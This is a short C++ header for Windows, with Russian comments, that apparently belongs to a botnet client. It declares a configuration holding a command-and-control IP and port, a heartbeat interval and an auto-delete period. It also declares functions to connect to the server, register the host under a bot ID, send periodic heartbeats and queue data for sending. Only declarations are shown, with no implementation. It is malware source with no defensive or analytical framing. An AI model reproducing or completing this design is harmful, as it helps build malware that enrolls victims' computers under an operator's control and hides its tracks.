#pragma once

#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>

struct Config {
    std::string c2_ip;
    int c2_port;
    int heartbeat_interval;
    int auto_delete_days;
};

// Асинхронная отправка
void init_network_async();
void shutdown_network_async();
void push_to_send_queue(const std::vector<uint8_t>& data, int priority = 1);

// Базовые сетевые функции
bool init_winsock();
void cleanup_winsock();
SOCKET connect_to_server(const std::string& ip, int port);
void register_with_server(SOCKET sock, const std::string& hostname, std::string& bot_id);
void heartbeat_loop(SOCKET& sock, const Config& cfg);

// Глобальный ID бота
extern std::string g_bot_id;